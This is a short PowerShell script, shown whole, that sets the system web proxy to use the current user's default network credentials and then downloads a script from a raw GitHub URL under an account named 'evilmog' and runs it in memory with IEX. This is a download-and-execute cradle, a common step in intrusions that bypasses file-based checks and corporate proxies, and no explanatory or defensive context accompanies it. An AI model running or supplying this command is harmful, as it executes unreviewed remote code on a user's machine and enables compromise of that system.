[System.Net.WebRequest]::DefaultWebProxy = [System.Net.WebRequest]::GetSystemWebProxy()
[System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials

IEX (New-Object Net.Webclient).downloadstring("https://raw.githubusercontent.com/evilmog/evilmog/master/powershell.ps1")
